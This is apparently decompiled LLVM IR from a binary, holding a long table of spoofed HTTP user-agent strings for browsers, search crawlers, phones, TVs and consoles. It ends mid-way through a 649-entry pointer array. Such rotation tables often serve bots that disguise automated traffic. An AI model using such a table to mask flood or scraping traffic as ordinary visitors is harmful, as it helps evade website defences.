@global_var_217e0.664 = constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00"
@global_var_21880.665 = constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00"
@global_var_218f4.666 = constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_2194c.667 = constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00"
@global_var_219a4.668 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_219e4.669 = constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00"
@global_var_21a4c.670 = constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00"
@global_var_21a80.671 = constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00"
@global_var_21ab0.672 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00"
@global_var_21b24.673 = constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00"
@global_var_21b90.674 = constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00"
@global_var_21bec.675 = constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00"
@global_var_21c54.676 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_21ca0.677 = constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_21cf4.678 = constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00"
@global_var_21d5c.679 = constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00"
@global_var_21da8.680 = constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_21e2c.681 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_21e70.682 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_21eb4.683 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_21ef8.684 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_21f3c.685 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_21f80.686 = constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00"
@global_var_21fb4.687 = constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00"
@global_var_21ff4.688 = constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00"
@global_var_22074.689 = constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00"
@global_var_220e0.690 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_22124.691 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_22194.692 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_22208.693 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_22254.694 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_222dc.695 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_22328.696 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_22398.697 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_22408.698 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_2247c.699 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_224f4.700 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_2253c.701 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_225b4.702 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_22624.703 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_22694.704 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_22728.705 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_22770.706 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_227b8.707 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_22834.708 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_228b0.709 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_22904.710 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_22958.711 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_229ac.712 = constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_22a44.713 = constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_22afc.714 = constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_22b9c.715 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_22c08.716 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_22c78.717 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_22cf0.718 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_22d34.719 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_22dac.720 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_22df0.721 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_22e54.722 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_22e9c.723 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_22ef0.724 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_22f68.725 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_22fd0.726 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_2301c.727 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_23080.728 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_230e8.729 = constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00"
@global_var_23174.730 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_231c8.731 = constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_23254.732 = constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00"
@global_var_232b0.733 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_232fc.734 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_23374.735 = constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00"
@global_var_233cc.736 = constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_2344c.737 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00"
@global_var_234b8.738 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_23530.739 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00"
@global_var_2357c.740 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00"
@global_var_235ec.741 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00"
@global_var_23630.742 = constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_23670.743 = constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00"
@global_var_236b4.744 = constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00"
@global_var_236f8.745 = constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00"
@global_var_23740.746 = constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00"
@global_var_237c0.747 = constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00"
@global_var_23814.748 = constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_238a4.749 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_23908.750 = constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_23958.751 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_239c4.752 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00"
@global_var_23a10.753 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_23a88.754 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_23acc.755 = constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00"
@global_var_23b00.756 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_23b44.757 = constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00"
@global_var_23bc0.758 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_23c10.759 = constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00"
@global_var_23c48.760 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00"
@global_var_23cc0.761 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_23d04.762 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00"
@global_var_23d44.763 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00"
@global_var_23d84.764 = constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00"
@global_var_23e10.765 = constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00"
@global_var_23e3c.766 = constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00"
@global_var_23e78.767 = constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00"
@global_var_23ea8.768 = constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00"
@global_var_23ef4.769 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00"
@global_var_23f34.770 = constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00"
@global_var_23f84.771 = constant [19 x i8] c"C4PC UserAgent/0.7\00"
@global_var_23f98.772 = constant [19 x i8] c"Googlebot 1.01.003\00"
@global_var_23fac.773 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00"
@global_var_23ff8.774 = constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00"
@global_var_24060.775 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00"
@global_var_240b4.776 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_24100.777 = constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_241b8.778 = constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00"
@global_var_24264.779 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_242b8.780 = constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00"
@global_var_2437c.781 = constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00"
@global_var_24418.782 = constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00"
@global_var_24488.783 = constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00"
@global_var_244e4.784 = constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00"
@global_var_24538.785 = constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00"
@global_var_245b0.786 = constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00"
@global_var_2460c.787 = constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00"
@global_var_24670.788 = constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00"
@global_var_246d0.789 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00"
@global_var_24728.790 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00"
@global_var_2476c.791 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00"
@global_var_247bc.792 = constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00"
@global_var_24840.793 = constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00"
@global_var_24894.794 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00"
@global_var_24904.795 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00"
@global_var_2499c.796 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00"
@global_var_249e8.797 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00"
@global_var_24a68.798 = constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00"
@global_var_24ae8.799 = constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00"
@global_var_24b68.800 = constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00"
@global_var_24be8.801 = constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00"
@global_var_24c68.802 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00"
@global_var_24ce8.803 = constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00"
@global_var_24d60.804 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_24dcc.805 = constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00"
@global_var_24e40.806 = constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00"
@global_var_24ec0.807 = constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00"
@global_var_24efc.808 = constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00"
@global_var_24f44.809 = constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00"
@global_var_24f88.810 = constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00"
@global_var_25058.811 = constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00"
@global_var_250b4.812 = constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00"
@global_var_25120.813 = constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00"
@global_var_25168.814 = constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00"
@global_var_251f0.815 = constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00"
@global_var_2523c.816 = constant [22 x i8] c"Wget/1.12 (linux-gnu)\00"
@global_var_25254.817 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_252c8.818 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_2533c.819 = constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00"
@global_var_253ac.820 = constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_1e9ec.518, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1ea2c.519, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_1ea6c.520, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_1eafc.521, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1eb34.522, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1eb54.523, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_1eb6c.524, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_1ebc4.525, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1ec64.526, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1ecb8.527, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1ed2c.528, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_1ed6c.529, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_1ee24.530, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_1ee78.531, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_1eed0.532, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1ef28.533, i32 0, i32 0), i8* 